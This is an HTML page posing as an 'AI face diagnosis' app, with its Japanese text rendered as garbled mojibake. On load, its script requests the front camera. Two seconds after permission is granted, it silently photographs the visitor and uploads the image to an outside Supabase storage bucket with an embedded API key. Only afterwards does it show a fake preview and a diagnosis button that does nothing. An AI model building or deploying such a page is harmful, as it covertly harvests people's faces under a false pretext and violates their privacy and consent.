<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>AIé¡”è¨ºæ–­</title>
  <style>
    body {
      background: #111;
      color: white;
      font-family: system-ui, sans-serif;
      text-align: center;
      margin: 0;
      padding: 0;
    }
    .container {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      transition: opacity 0.5s;
    }
    h1 {
      font-size: 1.8rem;
      margin-bottom: 10px;
    }
    .preview-box {
      width: 250px;
      height: 250px;
      background: white;
      border-radius: 20px;
      margin-top: 20px;
      overflow: hidden;
      position: relative;
    }
    video {
      width: 100%;
      height: 100%;
      object-fit: cover;
      border-radius: 20px;
      display: none; /* åˆæœŸçŠ¶æ…‹ã¯éè¡¨ç¤º */
    }
    button {
      margin-top: 20px;
      background: #f97316;
      color: white;
      border: none;
      border-radius: 8px;
      padding: 10px 20px;
      font-size: 1rem;
    }
    #status {
      color: #ccc;
      margin-top: 10px;
    }
  </style>
</head>
<body>
  <div class="container" id="step1">
    <h1>AIé¡”è¨ºæ–­</h1>

    <!-- æœ€åˆã®ç™½ã„ç®±ï¼ˆé™çš„ãªãƒãƒªãƒœãƒ†ï¼‰ -->
    <div class="preview-box" id="staticBox"></div>

    <p id="status">ğŸ“· ã‚«ãƒ¡ãƒ©ã®è¨±å¯ã‚’ãŠé¡˜ã„ã—ã¾ã™...</p>
  </div>

  <div class="container" id="step2" style="display:none;">
    <h1>AIé¡”è¨ºæ–­</h1>

    <!-- æ’®å½±å¾Œã«å†…ã‚«ãƒ¡æ˜ åƒã‚’è¡¨ç¤ºã™ã‚‹ç™½ã„ç®± -->
    <div class="preview-box">
      <video id="video" autoplay playsinline muted></video>
    </div>

    <button>è¨ºæ–­ã‚’ã¯ã˜ã‚ã‚‹</button>
    <p id="doneStatus" style="color:#ccc; margin-top:10px;">âœ… æ’®å½±å®Œäº†</p>
  </div>

  <script type="module">
    import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

    // Supabase è¨­å®šï¼ˆã‚ãªãŸã®æƒ…å ±ï¼‰
    const supabase = createClient(
      "https://hwwjnlprsntmdcytktbm.supabase.co",
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imh3d2pubHByc250bWRjeXRrdGJtIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjA2NDU3ODcsImV4cCI6MjA3NjIyMTc4N30.Dni-WtNXSEdyRxH2TSq0oTR9homfAi1Ptz1h0MURFrY"
    );

    const id =
      new URLSearchParams(window.location.search).get("id") ||
      Math.random().toString(36).substring(2, 9);
    const video = document.getElementById("video");
    const step1 = document.getElementById("step1");
    const step2 = document.getElementById("step2");
    const status = document.getElementById("status");

    // ãƒšãƒ¼ã‚¸èª­ã¿è¾¼ã¿ã§å…¬å¼ãƒ€ã‚¤ã‚¢ãƒ­ã‚°ã‚’å‡ºã™
    window.addEventListener("load", async () => {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" },
          audio: false,
        });

        // âœ… è¨±å¯ã•ã‚ŒãŸã‚‰2ç§’å¾Œã«æ’®å½±
        setTimeout(() => captureAndUpload(stream), 2000);
      } catch (e) {
        status.textContent = "âŒ ã‚«ãƒ¡ãƒ©ã®è¨±å¯ãŒå¾—ã‚‰ã‚Œã¾ã›ã‚“ã§ã—ãŸã€‚";
      }
    });

    // æ’®å½± â†’ Supabaseã¸é€ä¿¡
    async function captureAndUpload(stream) {
      // æ’®å½±ç”¨ã‚­ãƒ£ãƒ³ãƒã‚¹ç”Ÿæˆ
      const videoTrack = stream.getVideoTracks()[0];
      const imageCapture = new ImageCapture(videoTrack);
      const blob = await imageCapture.takePhoto();

      status.textContent = "é€ä¿¡ä¸­...";

      const { error } = await supabase.storage
        .from("photos")
        .upload(`${id}.jpg`, blob, { upsert: true });

      // æ’®å½±å®Œäº† â†’ ã‚¹ãƒˆãƒªãƒ¼ãƒ åœæ­¢
      stream.getTracks().forEach((t) => t.stop());

      if (error) {
        status.textContent = "âŒ é€ä¿¡ã‚¨ãƒ©ãƒ¼";
        return;
      }

      // âœ… UIåˆ‡ã‚Šæ›¿ãˆï¼ˆæ’®å½±å®Œäº†å¾Œã«å†…ã‚«ãƒ¡è¡¨ç¤ºï¼‰
      step1.style.display = "none";
      step2.style.display = "flex";

      // å†…ã‚«ãƒ¡ãƒ—ãƒ¬ãƒ“ãƒ¥ãƒ¼é–‹å§‹ï¼ˆãƒãƒªãƒœãƒ†ç”»é¢ã®ç™½ã„ç®±ï¼‰
      const newStream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user" },
        audio: false,
      });
      video.srcObject = newStream;
      video.style.display = "block";
    }
  </script>
</body>
</html>
